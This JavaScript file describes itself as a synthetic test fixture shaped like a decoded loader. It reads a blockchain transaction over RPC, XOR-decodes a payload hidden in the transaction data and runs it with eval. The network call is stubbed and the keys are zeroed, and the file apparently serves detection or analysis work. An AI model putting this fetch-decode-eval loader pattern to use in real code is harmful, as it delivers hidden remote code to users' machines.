// Synthetic test fixture shaped like the 7 October 2026 loader after string
// decoding. Not a real sample: the address key and the XOR key are made up.
(async function () {
  var addressKey = "00000000000000000000000000000000";
  async function postRPC(method, params, host) { return null; }
  async function checkBlock(n) {
    var block = await postRPC("eth_getBlockByNumber", ["0x" + n.toString(16), true], "rpc.example");
    for (var t of block["transactions"]) if (t["from"]["includes"](addressKey)) return t["to"];
  }
  async function getCode(key, blockNumber, txIndex) {
    var hosts = ["bsc-dataseed.binance.org", "bsc-rpc.publicnode.com"];
    var block = await postRPC("eth_getBlockByNumber", ["0x" + blockNumber.toString(16), true], hosts[0]);
    var data = Buffer["from"](block["transactions"][txIndex]["input"]["substring"](2), "hex")["toString"]("utf8")["split"]("?.?")[1];
    var r = "";
    for (var i = 0; i < data.length; i++) r += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    return r;
  }
  var serverKey = await checkBlock(256 * 100000 + 5);
  eval(await getCode("0000000000000000", parseInt(serverKey["substring"](2, 10), 16), parseInt(serverKey["substring"](10, 12), 16)));
})();
